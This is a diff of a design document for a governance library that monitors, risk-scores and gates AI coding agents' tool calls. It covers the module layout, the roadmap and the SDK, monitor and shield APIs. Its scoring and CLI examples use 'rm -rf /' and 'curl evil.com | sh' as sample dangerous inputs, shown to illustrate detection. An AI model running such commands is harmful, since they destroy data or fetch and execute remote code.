@@ -99,8 +99,8 @@ tracemill was extracted from CodePlane as a standalone library. CodePlane's obse
 ### Data Flow Summary
 
 `
-Observation: Source → [Parser] → Adapter → Enricher → Pipeline → Sink(s)
-Gate:        Hook Payload → Adapter.parse_one() → Enricher.classify() → PolicyEngine → Verdict
+Observation: Source → [Parser] → Adapter → Enricher → Pipeline (SessionMonitor) → Sink(s)
+Gate:        Hook Payload → Adapter.parse_one() → Enricher.classify() → Shield (GatePolicy) → Verdict
                                     ↑ same classify/ rules ↑
 `
 
@@ -974,9 +974,12 @@ tracemill/
 │       └── weekly-compat-audit.yml
 ├── src/tracemill/
 │   ├── __init__.py              # Public API surface
+│   ├── __main__.py              # `python -m tracemill`
+│   ├── _generated.py            # Generated EventKind constants
 │   ├── models.py                # StrictModel, FrozenModel bases
-│   ├── types.py                 # EventKind, SessionEvent, EventMetadata, etc.
-│   ├── pipeline.py              # EventPipeline fan-out
+│   ├── types.py                 # EventKind, SessionEvent, EventMetadata, TitleUpdate, etc.
+│   ├── trace.py                 # EventTrace, TraceStage (unified classification + assessment)
+│   ├── pipeline.py              # EventPipeline (fan-out + live phase/boundary/title structuring)
 │   ├── enricher.py              # Stateful enrichment (pairing, classification, risk)
 │   ├── adapters/
 │   │   ├── __init__.py
@@ -995,18 +998,33 @@ tracemill/
 │   ├── sinks/
 │   │   ├── __init__.py
 │   │   ├── base.py              # StorageSink ABC
-│   │   └── callback.py          # CallbackSink
+│   │   ├── callback.py          # CallbackSink (async callables)
+│   │   ├── console.py           # ConsoleSink (pretty terminal output)
+│   │   ├── jsonl.py             # JsonlSink (append-only, rotation)
+│   │   ├── sqlite_output.py     # SqliteSink (local SQLite)
+│   │   ├── s3.py                # S3Sink (object storage)
+│   │   ├── parquet.py           # ParquetSink (columnar analytics)
+│   │   ├── otel_exporter.py     # OtelExporterSink (OTLP spans)
+│   │   └── webhook.py           # WebhookSink (POST to URL)
 │   ├── parsers/
 │   │   ├── __init__.py
 │   │   ├── base.py              # MarkdownPreParser ABC
 │   │   ├── copilot.py           # CopilotPreParser
 │   │   └── aider.py             # AiderPreParser
-│   ├── preprocessors/
+│   ├── preprocessors/           # 14 preprocessors
 │   │   ├── __init__.py          # Registry + all imports
 │   │   ├── registry.py          # register/get_preprocessor
+│   │   ├── amazonq.py
+│   │   ├── antigravity.py
 │   │   ├── claude.py
 │   │   ├── cline.py
+│   │   ├── codex.py
+│   │   ├── continue_dev.py
+│   │   ├── copilot_vscode.py
 │   │   ├── goose.py
+│   │   ├── maf_transcript.py
+│   │   ├── openai_agents.py
+│   │   ├── opencode.py
 │   │   ├── openhands.py
 │   │   ├── pydantic_ai.py
 │   │   └── smolagents.py
@@ -1041,28 +1059,126 @@ tracemill/
 │   │   ├── loader.py            # Hierarchical config loading
 │   │   ├── defaults.py          # Default config template
 │   │   └── mappings.py          # Mapping file resolver
-│   ├── mappings/                # Bundled YAML mappings (16 files)
+│   ├── mappings/                # Bundled YAML mappings (22 files)
 │   │   ├── __init__.py
 │   │   ├── aider.yaml
 │   │   ├── aider_markdown.yaml
+│   │   ├── amazonq.yaml
+│   │   ├── antigravity.yaml
 │   │   ├── claude.yaml
 │   │   ├── cline.yaml
+│   │   ├── codex.yaml
+│   │   ├── continue_dev.yaml
 │   │   ├── copilot.yaml
 │   │   ├── copilot_markdown.yaml
+│   │   ├── copilot_vscode.yaml
 │   │   ├── crewai.yaml
 │   │   ├── goose.yaml
 │   │   ├── langgraph.yaml
 │   │   ├── maf.yaml
 │   │   ├── maf_transcript.yaml
+│   │   ├── openai_agents.yaml
 │   │   ├── opencode.yaml
 │   │   ├── openhands.yaml
 │   │   ├── pydantic_ai.yaml
 │   │   ├── smolagents.yaml
 │   │   └── sweagent.yaml
 │   ├── telemetry/
-│   │   └── __init__.py          # 🚧 Stub
-│   └── formatting/
-│       └── __init__.py          # 🚧 Stub
+│   │   └── __init__.py          # 🚧 Stub (self-metrics, #48). OTLP export ships via sinks/otel_exporter.py
+│   ├── formatting/
+│   │   ├── __init__.py
+│   │   ├── budget.py            # Budget / quota formatting
+│   │   └── density.py           # Event-density summarization
+│   ├── phase/                   # Live ML phase inference (default-on)
+│   │   ├── __init__.py
+│   │   ├── inferencer.py        # PhaseInferencer (stamps metadata.phase)
+│   │   ├── inference.py
+│   │   ├── features.py
+│   │   ├── event_rows.py
+│   │   ├── segmentation.py
+│   │   └── data/                # Packaged ONNX phase model
+│   ├── boundary/                # Live ML activity/step segmentation (default-on)
+│   │   ├── __init__.py
+│   │   ├── inferencer.py        # BoundaryInferencer (stamps metadata.boundary)
+│   │   ├── inference.py
+│   │   ├── features.py
+│   │   ├── decode.py
+│   │   └── data/                # Packaged ONNX boundary model
+│   ├── title/                   # Segment + session titling (segment titling opt-in)
+│   │   ├── __init__.py
+│   │   ├── inferencer.py        # TitleInferencer (emits async TitleUpdate)
+│   │   ├── inference.py
+│   │   ├── context.py
+│   │   ├── heuristics.py        # Zero-dep extractive session-title cascade
+│   │   ├── hygiene.py
+│   │   ├── naming.py            # HeuristicProvider / ApiProvider / build_session_titler
+│   │   ├── _resolve.py
+│   │   └── data/                # Packaged ONNX titler model
+│   ├── tracking/                # Deterministic phase segmenter (research signal, not live path)
+│   │   ├── __init__.py
+│   │   ├── models.py
+│   │   └── phase_tracker.py     # PhaseTracker
+│   ├── governance/              # Governance / assessment engine (26 modules)
+│   │   ├── __init__.py          # Public API re-exports
+│   │   ├── pipeline.py          # GovernancePipeline — composition root / facade (delegates)
+│   │   ├── monitor.py           # SessionMonitor — single writer (observe / process / lifecycle)
+│   │   ├── scorer.py            # Scorer — read-only preview (score_tool_call* / preflight)
+│   │   ├── context.py           # ContextBuilder — payload / event -> EnrichmentContext
+│   │   ├── phase1.py            # Phase1 — Phase-1 state-advance step (writer + preview share it)
+│   │   ├── assessor.py          # Assessor — (snapshot, event) -> SessionMeta (label+risk+drift)
+│   │   ├── registry.py          # SessionRegistry — residency + LRU eviction + reservations
+│   │   ├── codec.py             # MetaCodec — (de)serialize SessionMeta + snapshots
+│   │   ├── shield.py            # Shield — enforcement (gate context + pre/postflight + record)
+│   │   ├── results.py           # RecommendedAction, RiskRecommendation, SessionMeta, Evidence
+│   │   ├── types.py             # EnrichmentContext, ToolCallEvent, ToolResultEvent
+│   │   ├── state.py             # SessionState, budget / taint snapshots
+│   │   ├── labeler.py           # GovernanceLabeler (Phase 2 data labeling)
+│   │   ├── rules.py             # Data-driven rule engine
+│   │   ├── risk_wrapper.py      # Governance risk modifiers
+│   │   ├── pii.py               # PIIScanner
+│   │   ├── ifc.py               # IFCChecker (information-flow control)
+│   │   ├── integrity.py         # IntegrityVerifier
+│   │   ├── drift.py             # Phase DriftDetector
+│   │   ├── mcp_drift.py         # MCPIntegrityScanner
+│   │   ├── budget.py            # BudgetTracker
+│   │   ├── canonical.py         # Canonical event hashing
+│   │   ├── envelope.py          # EnrichedEvent, ContextGapEvent
+│   │   ├── observer.py          # TracemillObserver adapter
+│   │   └── persistence.py       # SystemStore (SQLite persistence)
+│   ├── sdk/                     # Pipeline + gating SDK
+│   │   ├── __init__.py          # Pipeline, EventTrace, Verdict, GatePolicy re-exports
+│   │   ├── gate_policy.py       # GatePolicy, preflight / postflight gates
+│   │   ├── gate_types.py        # GateContext, ToolCallRequest / Result
+│   │   └── verdict.py           # Verdict, Decision
+│   ├── gate/                    # Cross-process gate IPC
+│   │   ├── __init__.py
+│   │   ├── client.py
+│   │   ├── server.py
+│   │   └── registry.py
+│   ├── gates/                   # Bundled gate detectors
+│   │   ├── __init__.py
+│   │   ├── pii.py
+│   │   └── pii_patterns.yaml
+│   ├── migrations/              # Alembic SQLite migrations
+│   │   ├── __init__.py
+│   │   ├── env.py
+│   │   ├── runner.py
+│   │   ├── models.py
+│   │   ├── script.py.mako
+│   │   └── versions/
+│   └── cli/                     # Click CLI (entry point tracemill.cli:main)
+│       ├── __init__.py          # Command group: "governance pipeline for AI coding agents"
+│       ├── watch.py             # tracemill watch          (config-driven live pipeline)
+│       ├── replay.py            # tracemill replay         (one-shot file reprocess)
+│       ├── score.py             # tracemill score          (preflight scoring HTTP server)
+│       ├── gate_cmd.py          # tracemill gate           (apply a gate policy)
+│       ├── detect.py            # tracemill detect         (framework auto-detection)
+│       ├── config_cmd.py        # tracemill config         (inspect / emit config)
+│       ├── status.py            # tracemill status         (environment / model status)
+│       ├── init_cmd.py          # tracemill init           (scaffold ~/.tracemill)
+│       ├── download_cmd.py      # tracemill download-model
+│       ├── runner.py            # Shared pipeline runner
+│       └── factory.py           # Source / adapter / sink construction from config
 ├── tests/
 │   ├── __init__.py
 │   ├── conftest.py
@@ -1187,10 +1303,11 @@ tracemill/
 | Classification engine | ✅ Complete | Multi-dimensional taxonomy, shell AST (bash/PS/cmd), MCP profiles, tool lookup |
 | Risk scoring | ✅ Complete | Structural + flags + injection + taint + context. MITRE mappings. |
 | EventPipeline | ✅ Complete | Fan-out, error isolation, enricher integration |
-| Storage sinks | ✅ Complete | Callback, Console, Webhook, Jsonl, Sqlite, S3, OtelExporter |
-| CLI runner | ✅ Complete | `cli/` (11 modules) — config-driven pipeline + assess |
+| Storage sinks (8) | ✅ Complete | Callback, Console, Jsonl, Sqlite, S3, Parquet, OtelExporter, Webhook |
+| CLI | ✅ Complete | `cli/` (Click): watch, replay, score, gate, detect, config, status, init, download-model |
 | Gate module | ✅ Complete | Sync scoring path + PII gate + registry (`gate/`, `gates/`) |
-| Governance engine | 🚧 In progress | 18-module `governance/` (Phase 1/2/3, rules, labeler, IFC, drift, budget). See §22 + epic #7 |
+| Live structuring (phase / boundary / title) | ✅ Complete | Packaged CPU-only ONNX models: PhaseInferencer + BoundaryInferencer default-on, TitleInferencer opt-in (emits `TitleUpdate`) |
+| Governance / assessment engine | ✅ Complete | `governance/` monitor + shield object model (SOLID): `SessionMonitor` (single writer), `Scorer` (read-only preview), `SessionRegistry`, `Assessor`, `Shield`, one-counter `SessionState`, `GovernancePipeline` facade; plus labeler, rules, PII, IFC, integrity, drift, budget, observer, persistence. Epic #7 (#9–#27) delivered. See §22 |
 | Configuration system | ✅ Complete | Hierarchical loading, env overrides, discriminated unions, bootstrap |
 | Classify data files (9 YAMLs) | ✅ Complete | Binary info, rules, profiles, risk config |
 | CI/CD | ✅ Complete | Lint, test matrix, publish, weekly audits |
@@ -1200,57 +1317,266 @@ tracemill/
 
 | Item | Priority | Dependencies | Notes |
 |------|----------|--------------|-------|
-| **EventBus sugar** | Low | None | Pub/sub is already delivered via `CallbackSink` + `EventPipeline` fan-out (§15). Remaining is optional only: a `subscribe()` convenience + sync-callback adapter. Tracked by #47. |
 | **Telemetry self-metrics** | Medium | None | OTLP span export is done (`OtelExporterSink`, §14). Remaining is opt-in pipeline self-metrics (events/sec, enrichment latency, sink write time), near-zero footprint, no `opentelemetry-sdk` dep. Tracked by #48. |
-| **Phase/boundary tracking subsystem** | Medium | Enricher | Dedicated `phase/` + `boundary/` + `tracking/` ML subsystem (on PR #35, not yet merged). |
-| **Governance epic remainder** | High | Governance engine | Issues #9–#27: writer queue, backpressure queue, sink emission, observer adapter, test coverage. |
+| **PyPI release** | Medium | None | Publish `tracemill` + `tracemill-title-model` to PyPI. Packaging and CI publish workflow are already in place. |
+| **EventBus sugar** | Low | None | Pub/sub is already delivered via `CallbackSink` + `EventPipeline` fan-out (§15). Remaining is optional only: a `subscribe()` convenience + sync-callback adapter. Tracked by #47. |
+
+> **Delivered since this table was first written:** the live structuring subsystem
+> (`phase/` + `boundary/` + `title/`, formerly PR #35) and the full governance epic
+> (#7, stories #9–#27) are both merged and shipping. Issues #9–#27 remain open only as
+> tracker hygiene and should be closed.
 
 ### Implementation Order (Recommended)
 
 `
-1. Governance epic remainder (#9–#27) → completes the assessment engine vision
-2. Phase/boundary tracking merge (PR #35) → live phase classification + titling
-3. Telemetry self-metrics (#48)        → opt-in observability of tracemill itself
-4. EventBus sugar (#47)                → optional subscribe() convenience
+1. Telemetry self-metrics (#48)   → opt-in observability of tracemill itself
+2. PyPI release                   → publish tracemill + tracemill-title-model
+3. EventBus sugar (#47)           → optional subscribe() convenience
+4. Close governance epic issues (#9–#27) → tracker hygiene; work already delivered
 `
 
 ---
 
-## §22 — Assessment API & Integration Patterns
+## §22 — SDK, Runtime Monitor & Shield
 
-*Event in → assessment out. Enforcement is the consumer's responsibility.*
+*One session-state authority. The **monitor** observes; the **shield** enforces. Both compose
+the same assessment. Objects with single responsibilities, wired by dependency injection.*
 
 ### Scope
 
-tracemill is a **scoring library**. It observes agent tool calls, classifies them, evaluates governance rules, and produces a `GovernanceAssessment`. It does not issue verdicts, decide enforcement, or own the allow/deny decision.
+tracemill observes, parses, enriches, classifies, risk-scores, and structures agent events
+(§9–§11). **Governance is neither a separate track nor the whole pipeline** — it is a *runtime
+monitor* over a session's event trace, plus an optional *shield* (runtime enforcement) at the
+framework's execution boundary.
 
-The consumer — the application operating the agent — interprets the assessment and enforces accordingly: block, allow, escalate to a human, log and continue. Enforcement logic lives entirely in consumer code.
+* The **monitor** consumes enriched events, advances one per-session state, and produces an
+  assessment (data labeling, information-flow control, drift, budget, rule evaluation) stamped
+  onto `event.metadata.governance` as a `SessionMeta`. It is observation-first: it *recommends*
+  (`allow` / `warn` / `escalate` / `deny` / `transform`) and the consumer decides.
+* The **shield** is opt-in. When a `GatePolicy` is registered, it turns a recommendation into an
+  enforced `Verdict` at the framework's native pre/post-execution hook. Nothing is enforced
+  unless a policy is registered, so the default posture stays pure observation.
 
-### The Interface
+Monitor and shield are **objects with single responsibilities composed by dependency injection**,
+not a monolith. This section specifies that object model.
 
-```python
-assessment = pipeline.assess(payload)
+### The object model
+
+The engine dissolves into focused collaborators, each with one reason to change.
+`GovernancePipeline` is the **composition root / facade** that wires them and exposes the public
+API; the SDK `Pipeline` composes it with the observation backbone.
+
+| Collaborator | Single responsibility | Depends on |
+|---|---|---|
+| `SessionState` | Encapsulate one session's accumulators — **one** tool-call counter, budget dimensions, taint ledger, phase window, gate history. Mutated only through its own methods; exposes an immutable `snapshot()` and a detached `clone` for previews. | — |
+| `SystemStore` | Durability: idempotency reservations, atomic commit, crash recovery, audit persistence. | sqlite |
+| `SessionRegistry` | Residency: the one place sessions are created, found, and LRU-evicted; reservation bookkeeping. | `SystemStore` |
+| `ContextBuilder` | Bridge a raw hook payload / adapted `SessionEvent` into an `EnrichmentContext` (classification + shell-command analysis). | engine |
+| `Phase1` | The Phase-1 state-advance step — budget, taint (IFC), phase window, pressure — applied to whichever `SessionState` it is handed (the real one, or a clone). | budget, labeler |
+| `Assessor` | Turn `(snapshot, event)` into a `SessionMeta` — label + risk + recommendation + drift + MCP. Side-effect-free. | labeler, rules, engine |
+| `MetaCodec` | Serialize / deserialize `SessionMeta` and state snapshots for reservations and the audit trail. | — |
+| `SessionMonitor` | The **single writer**: per event, advance the real `SessionState` via `Phase1`, commit atomically, then call the `Assessor`. Owns `observe` / `process` / `lifecycle`. | `SessionRegistry`, `Phase1`, `Assessor`, `MetaCodec` |
+| `Scorer` | The **read side**: preview the same `Phase1` + `Assessor` against a **detached clone**, mutating no session state (audit-only persistence). Owns `score_tool_call*` / `preflight`. | `ContextBuilder`, `Phase1`, `Assessor`, `SessionRegistry` |
+| `GatePolicy` (Policy) | Map an assessed request/result to a `Verdict` (pre) / `PostflightVerdict` (post). An injected strategy. | — |
+| `Shield` | Runtime enforcement: build the gate context from `SessionState`, run the policy's pre/post chains, record allow/deny. | `GatePolicy`, `SessionRegistry` |
+| `gate_*` adapters | Bind one framework's execution hooks to the `Shield` (the edit-automaton at the edge). | `Shield` |
+| `GovernancePipeline` | **Composition root + facade**: build the collaborators; delegate `observe_event` / `score_tool_call*` / `process_*` / `gate_*`. | all of the above |
+
+```mermaid
+flowchart TB
+  subgraph Facade["GovernancePipeline — composition root / facade"]
+    direction TB
+    MON["SessionMonitor<br/>(single writer)"]
+    SCO["Scorer<br/>(read-only preview)"]
+    SH["Shield<br/>(enforcement)"]
+  end
+  REG["SessionRegistry<br/>(residency + eviction)"]
+  ST["SessionState<br/>(one counter, methods only)"]
+  ASS["Assessor<br/>(label · risk · drift · recommend)"]
+  POL["GatePolicy<br/>(Verdict strategy)"]
+  STORE["SystemStore<br/>(durability)"]
+
+  MON --> REG
+  MON --> ASS
+  SCO --> REG
+  SCO --> ASS
+  SH --> REG
+  SH --> POL
+  REG --> ST
+  REG --> STORE
+  MON -. advances .-> ST
+  SCO -. clones · no write .-> ST
+  SH -. reads via methods .-> ST
+
+  classDef writer fill:#fde2e8,stroke:#b3365f;
+  class MON writer;
 ```
 
-tracemill's job ends at returning the assessment:
+* **Single Responsibility** — no object both accumulates state and decides enforcement.
+* **Open/Closed** — `Assessor` and `GatePolicy` are strategies; swap them without editing the
+  monitor.
+* **Liskov** — any `Assessor` / `GatePolicy` implementation is substitutable.
+* **Interface Segregation** — the shield reads gate history through narrow `SessionState`
+  methods, never its fields.
+* **Dependency Inversion** — the monitor and shield depend on injected collaborators,
+  constructed once at the composition root.
+
+### One session-state authority
+
+`SessionState` owns exactly one tool-call counter. It previously carried two — a budget counter
+(advanced on observation) and a gate counter (advanced on allow) — the same quantity written by
+two owners on two clocks, never reconciled. They are now a single `tool_call_count` advanced
+through one method; budget pressure and the gate context both read it. State is mutated only
+through methods (`observe_tool_call`, `record_allow`, `record_denial`, `add_taint`, …), and
+collaborators that need gate history call methods (`denied_count`, `prior_verdicts`,
+`prior_tool_call_ids`) rather than touching fields. Encapsulation makes the twin-counter and
+cross-module-poke classes of bug unrepresentable.
+
+### Monitor observes, shield enforces
+
+Two compositions of the same collaborators:
+
+* **Observation (monitor alone).** Every pushed event is enriched → classified → structured →
+  **observed** (state advances once, on the canonical tool-call event) → assessed → emitted with
+  its `SessionMeta`. With no `GatePolicy`, nothing is enforced.
+* **Enforcement (monitor + shield).** At a framework's pre-execution hook the shield builds a
+  gate context from `SessionState`, runs the policy's preflight chain, and returns a `Verdict`
+  (allow / deny) enforced by the framework's native mechanism; a postflight chain can
+  redact / suppress / alert on the result. The shield records the outcome back into the same
+  `SessionState`, so budget stays honest: a denied call never reaches the monitor's commit and
+  costs no budget.
+
+The facade exposes one **write** entry point (the monitor) and two **read** entry points (the
+scorer), distinguished by state semantics:
+
+| Method (facade) | Owner | Input | Session state | Returns | Use |
+|--------|--------|-------|---------------|---------|-----|
+| `observe_event(event)` | `SessionMonitor` | `SessionEvent` | **advances (persists)** | `SessionMeta` | the pipeline stage (budget / taint / drift accrue) |
+| `score_tool_call_event(event)` | `Scorer` | `SessionEvent` | read-only (clone) | `SessionMeta` | preflight from an adapted event |
+| `score_tool_call(payload)` | `Scorer` | `dict` | read-only (clone) | `EventTrace` | preflight from a hook |
+
+`observe_event` is the mutating stage the `EventPipeline` calls; `score_tool_call*` preview against
+a **detached clone** of current state, committing nothing. Because the monitor is the single writer
+and the assessor is side-effect-free, a read-only score is literally "advance a throwaway clone the
+real session never sees, then assess its snapshot." Writer (`SessionMonitor`) and reader (`Scorer`)
+share the same `Phase1` and `Assessor`, so preview and live scoring cannot diverge.
+
+### Determinism contract
+
+Replaying a trace must reproduce the live assessment. Therefore **non-deterministic enrichment is
+an injected collaborator whose output is captured onto the event, never re-derived inside state
+mutation.** ML structurers (phase / boundary / title, §11) run once at ingestion and write their
+result onto the event; the monitor's Phase-1 mutation reads only captured values and
+deterministic heuristics. Replay injects a "captured-value" inferencer and reaches identical
+state. (Dependency Inversion applied to time: the *source* of a value is a dependency, so live
+and replay differ only in which implementation is injected.)
+
+### The SDK facade: `tracemill.sdk.Pipeline`
+
+The SDK's top-level entry point composes tracemill's two halves into one object:
+
+* the **observation backbone** (`tracemill.pipeline.EventPipeline`) — enrich → classify →
+  ML-structure (phase / boundary / title) → sinks, and
+* the **governance engine** (`GovernancePipeline`) — the monitor (+ optional shield).
+
+Governance is wired in as **one stage**: when enabled, each pushed event is observed and its
+`SessionMeta` stamped onto `event.metadata.governance` just before the sinks. Structuring runs
+with or without it.
+
+```python
+from tracemill.sdk import Pipeline
+from tracemill.sinks.jsonl import JsonlSink
+
+# Observe a stream: enrich -> classify -> structure -> observe -> emit
+async with Pipeline.create(sinks=[JsonlSink("events.jsonl")]) as pipeline:
+    async for event in adapter.stream(...):
+        await pipeline.push(event)   # emitted events carry metadata.governance
+```
+
+Construction:
+
+```python
+Pipeline.create(
+    config=None, *, policy=None, sinks=None,
+    enable_structure=True, enable_title=False, enricher=None, governance=True,
+) -> Pipeline
+Pipeline.from_config(path=None, *, policy=None, sinks=None, ...) -> Pipeline
+```
+
+* `config` — a `GovernanceConfig` for the engine (in-memory DB + defaults when omitted).
+  `from_config` loads it from a `tracemill.yaml` instead.
+* `policy` — a `GatePolicy` enabling the shield (the `gate_*` helpers). Omit for
+  observation-only usage.
+* `sinks` — observation destinations for pushed events. Omit for gating-only usage.
+* `enable_structure` / `enable_title` — phase + boundary (and optional title) ML structuring.
+  Models load lazily on first push, so gating-only usage pays nothing.
+* `governance` — wire the monitor in as a stage so pushed events get `metadata.governance`
+  stamped (default `True`). Set `False` for pure observation; `gate_*` / `score_tool_call` still
+  use the engine.
+
+The returned `Pipeline` exposes `await push(event)` / `push_span(span)` / `push_usage(usage)` /
+`flush()` / `close()`, `async with` (closes on exit), `score_tool_call(payload) -> EventTrace`
+(read-only preflight), the `gate_*` helpers (`gate_crewai()`, `gate_langchain(tool)`,
+`gate_langgraph(tools)`, `gate_semantic_kernel(kernel)`, `gate_maf()`,
+`gate_smolagents(agent_cls=None)`, `gate_pydantic_ai(agent)`, `gate_openai_agents(agent)`), and
+the `.governance` (engine) / `.backbone` (`EventPipeline`) escape hatches.
+
+### The governance engine: `GovernancePipeline`
+
+The composition root and facade, usable standalone. The `score` / `gate` CLIs and gating-only SDK
+use go straight to it; the SDK facade delegates to it. It constructs the `SessionRegistry`,
+`Assessor`, `SessionMonitor` (writer), `Scorer` (read-only preview), and `Shield`, then forwards
+to them.
+
+```python
+from tracemill.governance.pipeline import GovernancePipeline
+
+gov = GovernancePipeline.create()   # zero-config; or pass GovernanceConfig / policy=
+
+# Preflight from a raw payload -> unified EventTrace, no state mutation
+trace = gov.score_tool_call({
+    "tool_name": "bash",
+    "tool_input": {"command": "rm -rf /"},
+    "session_id": "sess-abc",
+})
+# trace.stage == "assessed"; trace.risk_score == 66; trace.risk_band == "danger"
+# trace.suggested_action == "escalate"; trace.reason == "risk_score_danger"
+```
+
+`EventTrace` (`tracemill.trace`) is the unified pipeline record — identity, classification, and
+assessment on one frozen object (abridged):
 
 ```python
 @dataclass(frozen=True, slots=True)
-class AssessmentResult:
-    governance_assessment: GovernanceAssessment  # allow/warn/escalate/deny/transform
-    risk_score: int                              # 0–100
-    reason: str | None                           # matched rule's reason code
-    matched_rule: str | None                     # rule ID that triggered
-    classification: Classification               # full classification output
-    transform: TransformSuggestion | None        # suggested rewrite (if TRANSFORM)
-    meta: SessionMeta                            # full pipeline state (taint, drift, budget)
-    elapsed_ms: float                            # assessment latency
+class EventTrace:
+    id: str
+    kind: EventKind
+    session_id: str
+    # classification (enricher fills)
+    mechanism: Mechanism | None
+    effect: Effect | None
+    scope: tuple[Scope, ...]
+    role: tuple[Role, ...]
+    action: tuple[Action, ...]
+    capability: tuple[Capability, ...]
+    structure: tuple[Structure, ...]
+    # assessment (assessor fills)
+    risk_score: int | None
+    risk_band: RiskBand | None
+    suggested_action: Recommendation | None   # allow/warn/escalate/deny/transform
+    reason: str | None                         # matched rule's reason code
+    stage: TraceStage                          # adapted -> classified -> assessed
 ```
 
-The `GovernanceAssessment` enum:
+`SessionMeta` (`tracemill.governance.results`) is the richer stateful output attached to
+`event.metadata.governance`: `classification`, `risk_assessment`, `recommendation` (a
+`RiskRecommendation` with `.recommended_action`, `.reason_code`, `.transform`), `budget_snapshot`,
+`drift`, `mcp_alerts`, `evidence`.
+
+The recommendation enum (`tracemill.governance.results`):
 
 ```python
-class GovernanceAssessment(StrEnum):
+class RecommendedAction(StrEnum):
     ALLOW = "allow"
     WARN = "warn"
     ESCALATE = "escalate"
@@ -1258,197 +1584,184 @@ class GovernanceAssessment(StrEnum):
     TRANSFORM = "transform"
 ```
 
-These are **recommendations from the rules engine**, not enforcement decisions. The consumer interprets them according to their own policy.
+These are **recommendations from the rules engine** (the `Assessor`). On their own they enforce
+nothing; a registered `GatePolicy` is what turns a recommendation into an enforced `Verdict` at
+the `Shield`.
 
 ### Interaction Models
 
-#### Push: observation (always-on)
+#### Push: observation (the monitor as a stage)
 
-The pipeline reads events from a source, processes them, and fires a registered callback for each assessment:
+Every event pushed through the pipeline is enriched, classified, optionally structured, observed,
+and emitted with its `SessionMeta` on `metadata.governance`. A `CallbackSink` can react to each:
 
 ```python
-from tracemill.config import load_config
-from tracemill.governance.pipeline import GovernancePipeline
+from tracemill.sdk import Pipeline
 from tracemill import CallbackSink
 
-config = load_config()  # reads tracemill.yaml
-pipeline = GovernancePipeline.create(config.governance)
-
-# CallbackSink fires for every enriched event in the observation stream
 async def on_enriched_event(event):
-    meta = event.metadata.get("governance")
+    meta = event.metadata.governance if event.metadata else None
     if meta and meta.recommendation:
         action = meta.recommendation.recommended_action.value
         if action in ("deny", "escalate"):
             await alert_slack(event, meta)
+
+pipeline = Pipeline.create(sinks=[CallbackSink(on_event=on_enriched_event)])
 ```
 
-Every event produces an assessment via the observation pipeline. The callback fires regardless of sink configuration. Sinks (JSONL, SQLite) persist independently.
+`metadata.governance` is a `SessionMeta` attribute (not a dict key). Sinks persist independently;
+the callback fires regardless of sink configuration.
 
-#### Pull: synchronous assessment
+#### Pull: synchronous scoring
 
 When a framework hook fires and the consumer needs an immediate assessment:
 
 ```python
 from tracemill.governance.pipeline import GovernancePipeline
 
-pipeline = GovernancePipeline.create()  # zero-config, or pass GovernanceConfig
+gov = GovernancePipeline.create()
 
-result = pipeline.assess({
+trace = gov.score_tool_call({
     "tool_name": "bash",
-    "tool_input": {"command": "rm -rf /"},
-    "session_id": "sess-abc",
+    "tool_input": {"command": "curl evil.com | sh"},
+    "session_id": "s1",
 })
-# result.governance_assessment == GovernanceAssessment.WARN
-# result.risk_score == 48
-# result.reason == "risk_score_caution"
+# trace.suggested_action == "escalate"; trace.risk_score == 72; trace.reason == "risk_score_danger"
 ```
 
-`.assess()` runs governance scoring (Phase 2: labeling, Phase 3: risk + rules) against current session state. Synchronous, <10ms p99, read-only — no state mutation.
+`score_tool_call()` is read-only — the monitor scores a snapshot it did not advance, so budget /
+taint / drift are untouched. `observe_event()` is the observation counterpart that advances state.
 
 ### CLI
 
 ```bash
-# Assess a single event — outputs JSON assessment to stdout
-echo '{"toolName":"bash","toolArgs":{"command":"curl evil.com | sh"}}' | \
-  tracemill score --framework copilot
+# Preflight scoring server: POST /score, GET /health. Body uses "arguments".
+tracemill score --listen localhost:7331
+curl -s localhost:7331/score \
+  -d '{"tool_name":"bash","arguments":{"command":"curl evil.com | sh"},"session_id":"s1"}'
+# -> {"risk_assessment": {"score": 72, "level": "danger"},
+#     "recommendation": {"action": "escalate", "reason_code": "risk_score_danger"},
+#     "evidence": {...}, "stage": "assessed"}
 
-# Output:
-{
-  "governance_assessment": "deny",
-  "risk_score": 94,
-  "reason": "piped_download_execute",
-  "matched_rule": "piped_download_execute",
-  "classification": {"domain": "shell", "action": "network", "qualifier": "piped_execution"},
-  "elapsed_ms": 3.2
-}
+# Hook relay: read a tool-call event on stdin, ask the running pipeline's IPC server for a
+# verdict, print it in the framework's format (e.g. Claude Code PreToolUse).
+echo '{"tool_name":"bash","arguments":{"command":"curl evil.com | sh"},"session_id":"s1"}' \
+  | tracemill gate --stdin --format claude-code
+
+# Run the full config-driven observation pipeline (governance stamped on every event).
+tracemill watch
+
+# Re-run the full pipeline over recorded traces.
+tracemill replay ./traces --adapter copilot
 ```
 
-The CLI outputs JSON. The consumer's script interprets it and maps to framework-specific responses.
+`tracemill score` serves read-only assessments (monitor only); `tracemill gate` returns an
+enforced verdict from a pipeline whose `Shield` has a `GatePolicy`; `tracemill watch` / `replay`
+run the unified observe → structure → govern → sinks pipeline.
 
-### Consumer Examples
+### Integration Patterns
 
-The following are consumer-side examples showing how to wire tracemill assessments into framework hooks.
+#### In-process gating (SDK)
 
-#### Shell hook (Copilot CLI)
-
-`.github/hooks/preToolUse.sh` — **consumer's script**:
-```bash
-#!/bin/bash
-ASSESSMENT=$(tracemill assess --framework copilot)
-RECOMMENDATION=$(echo "$ASSESSMENT" | jq -r '.governance_assessment')
-
-case "$RECOMMENDATION" in
-  deny|transform)
-    echo '{"permissionDecision":"deny","permissionDecisionReason":"'$(echo "$ASSESSMENT" | jq -r '.reason')'"}'
-    exit 2
-    ;;
-  escalate)
-    # Escalation handling is consumer-defined
-    exit 2
-    ;;
-  *)
-    exit 0
-    ;;
-esac
-```
-
-#### Shell hook (Claude Code CLI)
-
-`.claude/settings.json` points to **consumer's script**:
-```bash
-#!/bin/bash
-ASSESSMENT=$(tracemill assess --framework claude)
-RECOMMENDATION=$(echo "$ASSESSMENT" | jq -r '.governance_assessment')
-[ "$RECOMMENDATION" = "deny" ] && exit 2
-exit 0
-```
-
-#### SDK callback (Copilot SDK)
+The SDK composes a `GatePolicy` (preflight/postflight callbacks returning a `Verdict`) onto the
+pipeline's `Shield`, then binds it to a framework with one call:
 
 ```python
-from copilot.session import PermissionRequestResult
-from tracemill.governance.pipeline import GovernancePipeline
+from tracemill.sdk import Pipeline, GatePolicy, Verdict, ToolCallRequest, GateContext
 
-pipeline = GovernancePipeline.create()
+def preflight(request: ToolCallRequest, ctx: GateContext) -> Verdict:
+    if request.risk_score and request.risk_score > 60:
+        return Verdict.deny(f"score {request.risk_score} exceeds threshold")
+    return Verdict.allow()
 
